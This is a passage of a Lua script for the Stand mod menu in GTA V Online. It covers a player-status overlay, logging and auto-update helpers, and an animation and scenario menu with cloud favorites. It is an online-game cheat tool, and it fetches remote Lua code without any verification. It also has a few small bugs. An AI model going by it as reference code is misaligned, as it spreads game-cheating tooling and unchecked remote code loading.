					NETWORK.NETWORK_HANDLE_FROM_PLAYER(pid, PlayerHandle, 13)
					
					if players.is_godmode(pid) then 
						tag = tag .. "[G]"
						color = god
					end
					if players.is_in_interior(pid) then
						tag = tag .. "[I]"
						color = interior
					end
					if memory.read_int(getotr) ==  1 then
						tag = tag .. "[O]"
						color = otr
					end
					if players.get_script_host() == pid then
						tag = tag .. "[SH]"
						color = host
					end
					if players.get_host() == pid then
						tag = tag .. "[H]"
						color = host
					end
					if PLAYER.IS_PLAYER_DEAD(pid) then
						tag = tag .. "[D]"
						color = dead
					end
					if players.is_marked_as_modder(pid) then
						tag = tag .. "[M]"
						color = modder
					end
					if NETWORK.NETWORK_IS_FRIEND(PlayerHandle) then
						tag = tag .. "[F]"
						color = friend
					end
                    if PLAYER.IS_WANTED_AND_HAS_BEEN_SEEN_BY_COPS(PlayerHandle) then
						tag = tag .. "[W]"
						color = wanted
                        --HUD.FLASH_WANTED_DISPLAY(PlayerHandle)
					end
					memory.free(PlayerHandle)

					directx.draw_text(posx, posy, PlayerName .. " " .. tag, ALIGN_TOP_CENTRE, 0.5, color)
					posx = posx + 0.1
					if posx > 0.95 then
						posy = posy + 0.0175
						posx = 0.001
					end
				end
			end
		end
		util.yield()
	end
end)


local SCRIPT_SOURCE = "REPO"
local SCRIPT_BRANCH = "release"
local BRANCH_LAST_COMMIT = "d26731ac7ca2bf1339315b3eb8d5f26b378691f3"
local SCRIPT_BRANCH_IDS = {"jackzscript","master","release"}
local SCRIPT_BRANCH_NAMES = {{"jackzscript"},{"dev"},{"release"}}


local SCRIPT = "actions"
VERSION = "1.10.10"
local ANIMATIONS_DATA_FILE = filesystem.resources_dir() .. "/jackz_actions/animations.txt"
local ANIMATIONS_DATA_FILE_VERSION = "1.0"
local SPECIAL_ANIMATIONS_DATA_FILE_VERSION = "1.0.0" -- target version of actions_data

sexscript = menu.list(funfun, "Animation Script", {}, "", function(); end)

-- TEMPLATE: release/log.lua --
Log = {}
if SCRIPT_DEBUG == nil then
    SCRIPT_DEBUG = false
end
function Log._log(prefix, ...)
    local mod = debug.getinfo(3, "n").name or debug.getinfo(4, "n").name or "_anon_func"
    local msg = ""
    for _, a in ipairs(...) do
        if a == nil then a = "<nil>" end
        if type(a) == "table" then a = dumpTable(a) end
        msg = msg .. tostring(a) .. "\t"
    end
    if prefix then prefix = "[" .. prefix .. "] "
    else prefix = "" end
    util.log(string.format("%s%s:%s/%s: %s", prefix, SCRIPT_NAME, SCRIPT_SOURCE or "DEV", mod, msg))
end
function Log.debug(...)
    if SCRIPT_DEBUG then
        local arg = {...}
        Log._log("debug", arg)
    end
end
function Log.debugTable(table)
    if SCRIPT_DEBUG then
        local mod = debug.getinfo(3, "n").name or debug.getinfo(4, "n").name or "_anon_func"
        util.log(string.format("%s:%s/%s: %s", SCRIPT_NAME, SCRIPT_SOURCE or "DEV", mod, dumpTable(table)))
    end
end
function Log.warn(...)
    local arg = {...}
    Log._log("Warn", arg)
end
function Log.error(...)
    local arg = {...}
    Log._log("Error", arg)
end
function Log.severe(...)
    local arg = {...}
    Log._log("Severe", arg)
    util.stop_script()
end
function Log.log(...)
    local arg = {...}
    Log._log(nil, arg)
end

function dumpTable(o)
    if type(o) == 'table' then
       local s = '{ '
       for k,v in pairs(o) do
          if type(k) ~= 'number' then k = '"'..k..'"' end
          s = s .. '['..k..'] = ' .. dumpTable(v) .. ','
       end
       return s .. '} '
    elseif type(o) == "string" then
        return '"' .. o .. "'"
    else
       return tostring(o)
    end
end
-- END TEMPLATE --
-- TEMPLATE: release/repo.lua --
function download_resources_update(filepath, destOverwritePath)
    local lockPath = filesystem.scripts_dir() .. "/lib/" .. filepath .. ".lock"
    if filesystem.exists(lockPath) then
        util.log(SCRIPT_NAME .. ": Skipping resource update \" .. lib .. \", found update lockfile")
    end
    local lock = io.open(lockPath, "w")
    if lock == nil then
        util.toast(SCRIPT_NAME .. ": Could not create lockfile, skipping update", TOAST_ALL)
        return
    end
    lock:close()
    async_http.init("jackz.me", "/stand/get-lua.php?script=resources/" .. filepath .. "&source=" .. SCRIPT_SOURCE .. "&branch=" .. (SCRIPT_BRANCH or "master"), function(result, res_headers, status_code)
        os.remove(lockPath)
        if status_code ~= 200 or result:startswith("<") then
            util.toast("Resource returned invalid response for \"" .. filepath .. "\"\nSee logs for details")
            util.log(string.format("%s: Resource \"%s\" returned: %s", SCRIPT_NAME, filepath, result))
            return
        end
        local file = io.open(filesystem.resources_dir() .. (destOverwritePath or filepath), "w")
        if file == nil then
            util.toast("Could not write resource file for: " .. filepath .. "\nSee logs for details")
            util.log(string.format("%s: Resource \"%s\" file could not be created.", SCRIPT_NAME, filepath))
            return
        end
        Log.log("Updated resource ", filepath, "for", SCRIPT_NAME, "to branch", SCRIPT_BRANCH or "master")
        file:write(result:gsub("\r", "") .. "\n")
        file:close()
        util.toast(SCRIPT .. ": Automatically updated resource '" .. filepath .. "'")
    end, function(e)
        os.remove(lockPath)
        util.toast(SCRIPT .. " cannot load: Library files are missing. (" .. filepath .. ")", 10)
        util.stop_script()
    end)
    async_http.dispatch()
end

-- END TEMPLATE --
-- TEMPLATE: release/common.lua --
-- People keep trying to run stuff on non-stand
if not filesystem.stand_dir then
    print("Unsupported. Only stand is supported")
    return
end
----------------------------------------------------------------
-- Version Check
function get_version_info(version)
    if not version then error("Missing version", 2) end
    local major, minor, patch = version:match("(%d+)%.(%d+)%.(%d+)")
    return {
        major = tonumber(major) or 0,
        minor = tonumber(minor) or 0,
        patch = tonumber(patch) or 0
    }
end
function compare_version(a, b)
    local av = get_version_info(a)
    local bv = get_version_info(b)
    if not av or not bv then error("Missing versions to compare") end
    if av.major > bv.major then return 1
    elseif av.major < bv.major then return -1
    elseif av.minor > bv.minor then return 1
    elseif av.minor < bv.minor then return -1
    elseif av.patch > bv.patch then return 1
    elseif av.patch < bv.patch then return -1
    else return 0 end
end
if SCRIPT_BRANCH and SCRIPT_BRANCH == "release" then
    local VERSION_FILE_PATH = filesystem.store_dir() .. "jackz_versions.txt"
    if not filesystem.exists(VERSION_FILE_PATH) then
        local versionFile = io.open(VERSION_FILE_PATH, "w")
        if versionFile then
            versionFile:close()
        end
    end
    local versionFile = io.open(VERSION_FILE_PATH, "r+")
    if versionFile then
        local versions = {}
        for line in versionFile:lines("l") do
            local script, version = line:match("(%g+): (%g+)")
            if script then
                versions[script] = version
            end
        end
        if versions[SCRIPT_NAME] == nil or compare_version(VERSION, versions[SCRIPT_NAME]) == 1 then
            if versions[SCRIPT_NAME] ~= nil then
                async_http.init("jackz.me", "/stand/changelog.php?raw=1&script=" .. SCRIPT_NAME .. "&since=" .. versions[SCRIPT_NAME] .. "&branch=" .. (SCRIPT_BRANCH or "master"), function(result)
                    util.toast("Changelog for " .. SCRIPT_NAME .. " version " .. VERSION .. ":\n" .. result)
                end, function() util.log(SCRIPT_NAME ..": Could not get changelog") end)
                async_http.dispatch()
            end
            versions[SCRIPT_NAME] = VERSION
            versionFile:seek("set", 0)
            versionFile:write("# DO NOT EDIT ! File is used for changelogs\n")
            for script, version in pairs(versions) do
                versionFile:write(script .. ": " .. version .. "\n")
            end
        end
        versionFile:close()
    else
        util.log(SCRIPT_NAME .. ": Failed to access to version file")
    end
end
-- END Version Check
------------------------------------------------------------------
function show_busyspinner(text)
    HUD.BEGIN_TEXT_COMMAND_BUSYSPINNER_ON("STRING")
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(text)
    HUD.END_TEXT_COMMAND_BUSYSPINNER_ON(2)
end

SCRIPT_META_LIST = menu.list(sexscript, "Script Meta")
menu.divider(SCRIPT_META_LIST, SCRIPT_NAME .. " V" .. VERSION)
if SCRIPT_SOURCE == "MANUAL" then
    menu.list_select(SCRIPT_META_LIST, "Release Channel", {SCRIPT_NAME.."channel"}, "Sets the release channel for updates for this script.\nChanging the channel from release may result in bugs.", SCRIPT_BRANCH_NAMES, 1, function(index, name)
        show_busyspinner("Downloading update...")
        download_script_update(SCRIPT_BRANCH_IDS[index], function()
            HUD.BUSYSPINNER_OFF()
            util.log(SCRIPT_NAME .. ": Released channel changed to " .. SCRIPT_BRANCH_IDS[index])
            util.toast("Release channel changed to " .. name .. " (" .. SCRIPT_BRANCH_IDS[index] .. ")\nReload to apply changes")
        end, function()
            util.toast("Failed to download latest version for release channel.")
        end)
    end)
else
    menu.readonly(SCRIPT_META_LIST, "Release Channel", "Use the manual version from https://jackz.me/stand/get-latest-zip to change the release channel.")
end
if _lang ~= nil then
    menu.hyperlink(SCRIPT_META_LIST, "Help Translate", "https://jackz.me/stand/translate/?script=" .. SCRIPT, "If you wish to help translate, this script has default translations fed via google translate, but you can edit them here:\nOnce you make changes, top right includes a save button to get a -CHANGES.json file, send that my way.")
    _lang.add_language_selector_to_menu(SCRIPT_META_LIST)
end
menu.readonly(SCRIPT_META_LIST, "Build Commit", BRANCH_LAST_COMMIT and BRANCH_LAST_COMMIT:sub(1,10) or "Dev Build")
menu.action(SCRIPT_META_LIST, "Upload Logs", {}, "Uploads the last ~20 lines of your stand log (%appdata%\\Stand\\Log.txt) to hastebin.com.\nHastebin posts expire in upto 7 days.\n\nUploaded log can be accessed from \"Open Uploaded Log\" button below once pressed", function()
    local logs = io.open(filesystem.stand_dir() .. "Log.txt", "r")
    if logs then
        show_busyspinner("Uploading logs....")
        async_http.init("hastebin.com", "/documents", function(body)
            HUD.BUSYSPINNER_OFF()
            local url = "https://hastebin.com/" .. body:sub(9, -3)
            util.toast("Uploaded: " .. url)
            menu.hyperlink(SCRIPT_META_LIST, "Open Uploaded Log", url)
        end, function()
            util.toast("Failed to submit logs, network error")
            HUD.BUSYSPINNER_OFF() 
        end)
        logs:seek("end", -3072)
        local content = logs:read("*a")
        async_http.set_post("text/plain",
            string.format("Script: %s\nSource: %s\nBranch: %s\nVersion: %s\nCommit: %s\n%s", SCRIPT_NAME, SCRIPT_SOURCE or "UNK", SCRIPT_BRANCH or "UNK", VERSION or "UNK", BRANCH_LAST_COMMIT or "DEV BUILD", content)
        )
        async_http.dispatch()
        logs:close()
    else
        util.toast("Could not read your stand log file")
    end
end)

SCRIPT_DEBUG = SCRIPT_SOURCE == nil

function try_require(name, isOptional)
    local status, data = pcall(require, name)
    if status then
        return data
    else
        if data then
            util.toast(name .. ": " .. data, TOAST_ALL)
        end
        if SCRIPT_SOURCE == "REPO" then
            if isOptional then
                Log.debug("Missing optional dependency: " .. name)
            else
                util.toast("Missing a required depencency (\"" .. name .. "\"). Please install this from the repo > dependencies list")
                Log.severe("Missing required dependency:", name)
            end
        elseif download_lib_update then
            local lockPath = download_lib_update(name, function()
                Log.log("Downloaded ", isOptional and "optional" or "required", "library:", name)
            end)
            while filesystem.exists(lockPath) do
                util.yield(500)
            end
            return require(name)
        end
        return nil
    end
end
-- END TEMPLATE --

if metaList then
    menu.divider(metaList, "-- Credits --")
    menu.hyperlink(metaList, "dpemotes", "https://github.com/andristum/dpemotes/", "For the special animations section, code was modified from repository")
end

-- Iterates in consistent order a Key/Value
function pairsByKeys(t, f)
    local a = {}
    for n in pairs(t) do
       table.insert(a, n)
    end
    table.sort(a, f)
    local i = 0 -- iterator variable
    local iter = function()
        -- iterator function
        i = i + 1
        if a[i] == nil then
            return nil
        else
            return a[i], t[a[i]]
        end
    end
    return iter
 end

local status = pcall(require, 'resources/addict_actions/addict_action')
if not status then
    util.toast("Failed to load resource file: addict_actions/addict_action.lua")
    util.stop_script()
end
if ANIMATION_DATA_VERSION ~= SPECIAL_ANIMATIONS_DATA_FILE_VERSION then
    if SCRIPT_SOURCE == "MANUAL" then
        download_resources_update("addict_actions/addict_action.min.lua", "addict_actions/addict_action.lua")
        util.toast("Restart script to use updated resource file")
    else
        util.toast("addict_actions: Warn: Outdated or missing addict_action. Version: " .. (ANIMATION_DATA_VERSION or "<missing>"))
        util.stop_script()
    end
end

-- Messy Globals
local scenarioCount = 0

local clearActionImmediately = true
local favorites = {}
local favoritesActions = {}
local recents = {}
-- local animFlags = AnimationFlags.ANIM_FLAG_REPEAT | AnimationFlags.ANIM_FLAG_ENABLE_PLAYER_CONTROL
local allowControl = true
local affectType = 0
-----------------------
-- SCENARIOS
----------------------

menu.action(sexscript, "Stop All Actions", {"stopself"}, "Stops the current scenario or animation", function(v)
    clear_anim_props()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    if clearActionImmediately then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
    else
        TASK.CLEAR_PED_TASKS(ped)
    end
    if affectType > 0 then
        local peds = entities.get_all_peds_as_handles()
        for _, npc in ipairs(peds) do
            if not PED.IS_PED_A_PLAYER(npc) and not PED.IS_PED_IN_ANY_VEHICLE(npc, true) then
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(npc)
                if clearActionImmediately then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(npc)
                else
                    TASK.CLEAR_PED_TASKS(npc)
                end
            end
        end
    end
end)
menu.toggle(sexscript, "Clear Action Immediately", {"clearimmediately"}, "If enabled, will immediately stop the animation / scenario that is playing when activating a new one. If false, you will transition smoothly to the next action.", function(on)
    lclearActionImmediately = on
end, clearActionImmediately)
menu.list_select(sexscript, "Action Targets", {"actiontarget"}, "The entities that will play this action.\n0 = Only yourself\n1 = Only NPCs\n2 = Both you and NPCS", { { "Only yourself" }, { "Only NPCs" }, {"Both"} }, 1, function(index)
    affectType = index - 1
end)


function onControllablePress(value)
    if value then
        animFlags = AnimationFlags.ANIM_FLAG_REPEAT | AnimationFlags.ANIM_FLAG_ENABLE_PLAYER_CONTROL
    else
        animFlags = AnimationFlags.ANIM_FLAG_REPEAT
    end
end


function generateAnimationAction(key, data)
    return function()
        util.toast("Playing anim: " .. data[3] or key)
        util.log(string.format("dict=%s anim=%s name=%s", data[1], data[2], data[3]))
        play_animation(data[1], data[2], false, data)
    end
end

menu.divider(sexscript, "Stuff")
local specialAnimationsMenu = menu.list(sexscript, "Special Animations", {}, "Special animations that can use props")
menu.toggle(specialAnimationsMenu, "Controllable", {"animationcontrollable"}, "Should the animation allow player control?", onControllablePress, allowControl)
local animationsMenu = menu.list(sexscript, "Animations", {}, "List of animations you can play")
menu.toggle(animationsMenu, "Controllable", {"animationcontrollable"}, "Should the animation allow player control?", onControllablePress, allowControl)

local specialAnimationsMenu2 = menu.list(specialAnimationsMenu, "Addict Made Animations", {}, "Just like special animations that can use props")

menu.action(specialAnimationsMenu2,"Attach A Umbrella", {}, "", function()
    menu.trigger_commands("playanimcrossarms6")
    local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid, players.user_ped())
    local playerpos = ENTITY.GET_ENTITY_COORDS(id)
    playerpos.z = playerpos.z + 3
    local candyattach = util.joaat("p_amb_brolly_01")
    STREAMING.REQUEST_MODEL(candyattach)
    while not STREAMING.HAS_MODEL_LOADED(candyattach) do
        util.yield()
    end
    local cane1 = entities.create_object(candyattach, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(cane1, id, playerpos, 0.2, 0.2, 0.5, 0, 0, 0, -180, 0, true, true, false, 0, true)
    ENTITY.SET_ENTITY_VISIBLE(cane1, true, 0)
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(cane1)
    util.yield(100)
end)

for category, rows in pairsByKeys(SPECIAL_ANIMATIONS) do
    local catmenu = menu.list(specialAnimationsMenu, category, {})
    for key, data in pairsByKeys(rows) do
        menu.action(
            catmenu,
            data[3] or key,
            {"playanim"..key},
            string.format("%s %s\nPlay this animation\nAnimation Id: %s", data[1], data[2], key),
            generateAnimationAction(key, data)
        )
    end
end


-----------------------
-- ANIMATIONS
----------------------
local animLoaded = false
local animAttachments = {}
function clear_anim_props()
    for ent, shouldDelete in pairs(animAttachments) do
        if shouldDelete then
            entities.delete(ent)
        else
            ENTITY.DETACH_ENTITY(ent, false)
        end
    end
end
function delete_anim_props()
    for ent, _ in pairs(animAttachments) do
        entities.delete(ent)
    end
end

local animMenuData = {}
local resultMenus = {}
local cloudFavoritesMenu = menu.list(animationsMenu, "Cloud Favorites", {}, "View categorized saved favorites from other users, or store your own.")
local favoritesMenu = menu.list(animationsMenu, "Favorites", {}, "List of all your favorited animations. Hold SHIFT to add or remove from favorites.")
local cloudFavoritesUploadMenu = menu.list(cloudFavoritesMenu, "Upload", {}, "Add your own cloud animation favorites. BETA.")
    local cloudUploadFromFavorites = menu.list(cloudFavoritesUploadMenu, "From Favorites", {}, "Browse your favorite played animations to upload them", function() populate_cloud_list(true) end)
    local cloudUploadFromRecent = menu.list(cloudFavoritesUploadMenu, "From Recent", {}, "Browse your recently played animations to upload them",  function() populate_cloud_list(false) end)
local cloudFavoritesBrowseMenu = menu.list(cloudFavoritesMenu, "Browse", {}, "Browse all uploaded cloud animation favorites")

local cloudUsers = {} -- Record<user, { menu, categories = Record<dictionary, { menu, animations = {} }>}
local cloud_loading = false
function cloudvehicle_fetch_error(code)
    return function()
        cloud_loading = false
        util.toast("An error occurred fetching cloud data. Code: " .. code, TOAST_ALL)
        HUD.BUSYSPINNER_OFF()
    end
end
local cloud_list = {}
function upload_animation(group, animation, alias)
    show_busyspinner("Uploading animation")
    async_http.init('jackz.me',
        string.format(
            '/stand/cloud/actions/manage?scname=%s&hash=%d&alias=%s&dict=%s&anim=%s',
            SOCIALCLUB._SC_GET_NICKNAME(),
            menu.get_activation_key_hash(),
            alias or '',
            group,
            animation
        ),
        function(body)
            if body == "OK" then
                util.toast("Upload successful for " .. group .. "/" .. animation)
            elseif body == "Conflict" then
                util.toast("Animation already uploaded")
            else
                util.toast("Upload failed for " .. group .. "/" .. animation .. ": " .. body)
            end
            HUD.BUSYSPINNER_OFF()
        end
    )
    async_http.set_post('text/plain', '')
    async_http.dispatch()
end
function populate_cloud_list(useFavorites)
    local listMenu = useFavorites and cloudUploadFromFavorites or cloudUploadFromRecent
    local tuple = useFavorites and favorites or recents
    for _, m in ipairs(cloud_list) do
        menu.delete(m)
    end
    cloud_list = {}
    for _, favorite in ipairs(tuple) do
        local name = favorite[2]
        -- if favorite[3] then
        --     name = favorite[3] .. " (" .. favorite[2] .. ")"
        -- end
        local action = menu.action(listMenu, name, {}, "Upload the " .. favorite[2] .. " from group " .. favorite[1] .. " to the cloud", function(v)
            upload_animation(favorite[1], favorite[2], nil)
        end)
        table.insert(cloud_list, action)
    end
end
function populate_user_dict(user, dictionary)
    show_busyspinner("Fetching animations for " .. dictionary)
    while cloud_loading do
        util.yield()
    end
    cloud_loading = true
    async_http.init('jackz.me', '/stand/cloud/actions/list?method=actions&scname=' .. user .. "&dict=" .. dictionary, function(body)
        cloud_loading = false
        if body:sub(1, 1) == "<" then
            util.toast("Ratelimited, try again in a few seconds.")
            menu.divider(cloudUsers[user].categories[dictionary].menu, "Ratelimited, try again in a few seconds")
            return
        end
        for _, animation in ipairs(cloudUsers[user].categories[dictionary].animations) do
            pcall(menu.delete, animation)
        end
        cloudUsers[user].categories[dictionary].animations = {}
        local count = 0
        for animation in string.gmatch(body, "[^\r\n]+") do
            count = count + 1
            local action = menu.action(cloudUsers[user].categories[dictionary].menu, animation, {}, dictionary .. " " .. animation, function(_)
                play_animation(dictionary, animation)
            end)
            table.insert(cloudUsers[user].categories[dictionary].animations, action)
        end
        menu.set_menu_name(cloudUsers[user].categories[dictionary].menu, dictionary .. " (" .. count .. ")")
        HUD.BUSYSPINNER_OFF()
    end, cloudvehicle_fetch_error("FETCH_USER_ANIMS"))
    async_http.dispatch()
end
menu.on_focus(cloudFavoritesBrowseMenu, function()
    show_busyspinner("Fetching users")
    while cloud_loading do
        util.yield()
    end
    cloud_loading = true
    async_http.init('jackz.me', '/stand/cloud/actions/list?method=users', function(body)
        cloud_loading = false
        if body:sub(1, 1) == "<" then
            cloudvehicle_fetch_error("RATELIMITED")
            return
        end
        for user, udata in pairs(cloudUsers) do
            pcall(menu.delete, udata.menu)
            for dictionary, cdata in pairs(udata.categories) do
                pcall(menu.delete, cdata.menu)
                for i, animation in ipairs(cdata.animations) do
                    pcall(menu.delete, animation)
                    cdata.animations[i] = nil
                end
                udata.categories[dictionary] = nil
            end
            cloudUsers[user].menu = nil
        end
        for user in string.gmatch(body, "[^\r\n]+") do
            local userMenu = menu.list(cloudFavoritesBrowseMenu, user, {}, "All action categories favorited by " .. user)
            cloudUsers[user] = {
                menu = userMenu,
                categories = {}
            }
            -- TODO: Move from on_focus to on click
            menu.on_focus(userMenu, function(_)
                show_busyspinner("Fetching dictionaries for " .. user)
                while cloud_loading do
                    util.yield()
                end
                cloud_loading = true
                async_http.init('jackz.me', '/stand/cloud/actions/list?method=dicts&scname=' .. user, function(body)
                    cloud_loading = false
                    if body:sub(1, 1) == "<" then
                        cloudvehicle_fetch_error("RATELIMITED")
                        return
                    end
                    for dictionary, cdata in pairs(cloudUsers[user].categories) do
                        pcall(menu.delete, cdata.menu)
                        for animation in ipairs(cdata.animations) do
                            pcall(menu.delete, animation)
                        end
                    end
                    cloudUsers[user].categories = {}
                    local count = 0
                    for dictionary in string.gmatch(body, "[^\r\n]+") do
                        count = count + 1
                        local dictMenu = menu.list(userMenu, dictionary, {}, "All actions in " .. dictionary .. " favorited by " .. user, function() populate_user_dict(user, dictionary) end)
                        cloudUsers[user].categories[dictionary] = {
                            menu = dictMenu,
                            animations = {}
                        }
                    end
                    menu.set_menu_name(userMenu, user .. " (" .. count .. ")")
                    HUD.BUSYSPINNER_OFF()
                end, cloudvehicle_fetch_error("FETCH_USER_CATEGORIES"))
                async_http.dispatch()
            end)
        end
        HUD.BUSYSPINNER_OFF()
    end, cloudvehicle_fetch_error("FETCH_USERS"))
    async_http.dispatch()
end)
local recentsMenu = menu.list(animationsMenu, "Recents", {}, "List of all your recently played animations")
menu.divider(animationsMenu, "Raw Animations")
local searchMenu = menu.list(animationsMenu, "Search", {}, "Search for animation groups")
menu.action(searchMenu, "Search Animation Groups", {"searchanim"}, "Searches all animation groups for the inputted text", function()
    menu.show_command_box("searchanim ")
end, function(args)
    -- Delete existing results
    for _, m in ipairs(resultMenus) do
        pcall(menu.delete, m)
    end
    resultMenus = {}
    -- Find all possible groups
    local results = {}
    -- loop ANIMATIONS by heading then subheading then insert based on result
    if not filesystem.exists(ANIMATIONS_DATA_FILE) then
        download_animation_data()
    end
    -- Parse the file
    local isHeaderRead = false
    -- Possibly recurse down categories splitting on _ and @
    for line in io.lines(ANIMATIONS_DATA_FILE) do
        if isHeaderRead then
            
            local i, j = line:find(args)
            if i then
                chunks = {} -- [ category, anim ]
                for substring in string.gmatch(line, "%S+") do
                    table.insert(chunks, substring)
                end
                -- Add the distance:
                chunks[3] = j - i
                table.insert(results, chunks)
            end
            -- TODO: Add back organization to list
        else
            local version = line:sub(2)
            if version ~= ANIMATIONS_DATA_FILE_VERSION then
                util.toast("Animation data out of date, updating...")
                download_animation_data()
            end
            isHeaderRead = true
        end
    end
    -- Sort by distance
    table.sort(results, function(a, b) return a[3] > b[3] end)
    -- Messy, but no way to call a list group, so recreate all animations in a sublist:
    for i = 1, 201 do
        if results[i] then
            -- local m = menu.list(searchMenu, group, {}, "All animations for " .. group)
           local m = menu.action(searchMenu, results[i][2], {"animate" .. results[i][1] .. " " .. results[i][2]}, "Plays the " .. results[i][2] .. " animation from group " .. results[i][1], function(v)
                play_animation(results[i][1], results[i][2], false)
            end)
            table.insert(resultMenus, m)
        end
    end
end)
local browseMenu = menu.list(animationsMenu, "Browse Animations", {}, "WARNING: Will cause a freeze when exiting, stand does not like unloading 15,000 animations. Use search if your pc cannot handle.", function() setup_animation_list() end)
menu.on_focus(browseMenu, function()
    if animLoaded then
        util.toast("WARN: Unloading animation browse list, prepare for lag.")
        util.yield(100)
        destroy_animations_data()
    end
end)
show_busyspinner("Loading Menus...")

--
local scenariosMenu = menu.list(sexscript, "Scenarios", {}, "List of scenarios you can play\nSome scenarios only work on certain genders, example AA Coffee only works on male peds.")
for group, scenarios in pairs(SCENARIOS) do
    local submenu = menu.list(scenariosMenu, group, {}, "All " .. group .. " scenarios")
    for _, scenario in ipairs(scenarios) do
        scenarioCount = scenarioCount + 1
        menu.action(submenu, scenario[2], {"scenario"}, "Plays the " .. scenario[2] .. " scenario", function(v)
            local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
            
            -- Play scenario on all npcs if enabled:
            if affectType > 0 then
                local peds = entities.get_all_peds_as_handles()
                for _, npc in ipairs(peds) do
                    if not PED.IS_PED_A_PLAYER(npc) and not PED.IS_PED_IN_ANY_VEHICLE(npc, true) then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(npc)
                        if clearActionImmediately then
                            TASK.CLEAR_PED_TASKS_IMMEDIATELY(npc)
                        end
                        TASK.TASK_START_SCENARIO_IN_PLACE(npc, scenario[1], 0, true);
                    end
                end
            end
            -- Play scenario on self if enabled:
            if affectType == 0 or affectType == 2 then
                if clearActionImmediately then
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                end
                TASK.TASK_START_SCENARIO_IN_PLACE(ped, scenario[1], 0, true);
            end
        end)
    end
end
HUD.BUSYSPINNER_OFF()

local selfSpeechPed = {
    entity = 0,
    lastUsed = os.millis(),
    model = util.joaat("a_f_m_bevhills_01")
}

-----------------------
-- Animation Functions
----------------------
-- Maybe smart deletion but eh
function populate_favorites()
    for _, action in ipairs(favoritesActions) do
        menu.delete(action)
    end
    favoritesActions = {}
    for _, favorite in ipairs(favorites) do
        local name = favorite[2]
        if favorite[3] then
            name = favorite[3] .. " (" .. favorite[2] .. ")"
        end
        local a
        a = menu.action(favoritesMenu, name, {}, "Plays " .. favorite[2] .. " from group " .. favorite[1], function(v)
            if PAD.IS_CONTROL_PRESSED(2, 209) then
                menu.show_warning(a, 2, "Are you sure you want to remove this animation from your favorites", function()
                    play_animation(favorite[1], favorite[2], false, nil, true)
                end)
            else
                play_animation(favorite[1], favorite[2], false)
            end
        end)
        table.insert(favoritesActions, a)
    end
end

function is_anim_in_recent(group, anim)
    for _, recent in ipairs(recents) do
        if recent[1] == group and recent[2] == anim then
            return true
        end
    end
    return false
end

function add_anim_to_recent(group, anim)
    if #recents >= 20 then
        menu.delete(recents[1][3])
        table.remove(recents, 1)
    end
    local action = menu.action(recentsMenu, anim, {"animate" .. group .. " " .. anim}, "Plays the " .. anim .. " animation from group " .. group, function(v)
        play_animation(group, anim, true)
    end)
    table.insert(recents, { group, anim, action })
end
function download_animation_data()
    local loading = true
    show_busyspinner("Downloading animation data")
    async_http.init("jackz.me", "/stand/resources/jackz_actions/animations.txt", function(result)
        local file = io.open(ANIMATIONS_DATA_FILE, "w")
        file:write(result:gsub("\r", ""))
        file:close()
        util.log(SCRIPT .. ": Downloaded resource file successfully")
        HUD.BUSYSPINNER_OFF()
        loading = false
    end, function()
        util.toast(SCRIPT .. ": Failed to automatically download animations data file. Please download latest file manually.")
        util.stop_script()
        loading = false
    end)
    async_http.dispatch()
    while loading do
        util.yield()
    end
    HUD.BUSYSPINNER_OFF()
end
function destroy_animations_data()
    for category, data in pairs(animMenuData) do
        pcall(menu.delete, data.list)
    end
    animMenuData = {}
    animLoaded = false
    menu.collect_garbage()
end
function setup_category_animations(category)
    animMenuData[category].menus = {}
    for _, animation in ipairs(animMenuData[category].animations) do
        local action = menu.action(animMenuData[category].list, animation, {"animate" .. category .. " " .. animation}, "Plays the " .. animation .. " animation from group " .. category, function(v)
            play_animation(category, animation, false)
        end)
        table.insert(animMenuData[category].menus, action)
    end
end
function setup_animation_list()
    if animLoaded then
        return
    end
    -- Download animation file if does not exist
    if not filesystem.exists(ANIMATIONS_DATA_FILE) then
        download_animation_data()
    end
    -- Parse the file
    local isHeaderRead = false
    -- Possibly recurse down categories splitting on _ and @
    for line in io.lines(ANIMATIONS_DATA_FILE) do
        if isHeaderRead then
            chunks = {} -- [ category, anim ]
            for substring in string.gmatch(line, "%S+") do
                table.insert(chunks, substring)
            end
            if #chunks == 2 then
                local category = chunks[1]
                if animMenuData[category] == nil then
                    animMenuData[category] = {
                        animations = {},
                    }
                    local list = menu.list(browseMenu, category, {}, "", function() setup_category_animations(category) end
                    , function()
                        if animMenuData[category].menus then
                            for _, m in ipairs(animMenuData[category].menus) do
                                pcall(menu.delete, m)
                            end
                            animMenuData[category].menus = nil
                        end
                    end)
                    animMenuData[category].list = list
                end
                table.insert(animMenuData[chunks[1]].animations, chunks[2])
            end
        else
            local version = line:sub(2)
            if version ~= ANIMATIONS_DATA_FILE_VERSION then
                util.toast("Animation data out of date, updating...")
                download_animation_data()
            end
            isHeaderRead = true
        end
    end
    animLoaded = true
end

function play_animation(group, anim, doNotAddRecent, data, remove)
    local flags = animFlags -- Keep legacy animation flags
    local duration = -1
    local props
    if data ~= nil then
        flags = AnimationFlags.ANIM_FLAG_NORMAL
        if data.AnimationOptions ~= nil then
            if data.AnimationOptions.Loop then
                flags = flags | AnimationFlags.ANIM_FLAG_REPEAT
            end
            if data.AnimationOptions.Controllable then
                flags = flags | AnimationFlags.ANIM_FLAG_ENABLE_PLAYER_CONTROL | AnimationFlags.ANIM_FLAG_UPPERBODY
            end
            if data.AnimationOptions.EmoteDuration then
                duration = data.AnimationOptions.EmoteDuration
            end
        end
        if data.AnimationOptions and data.AnimationOptions.Props then
            props = data.AnimationOptions.Props
        end
    end
    if remove then
        for i, favorite in ipairs(favorites) do
            if favorite[1] == group and favorite[2] == anim then
                table.remove(favorites, i)
                populate_favorites()
                save_favorites()
                util.toast("Removed " .. group .. "\n" .. anim .. " from favorites")
                return
            end
        end
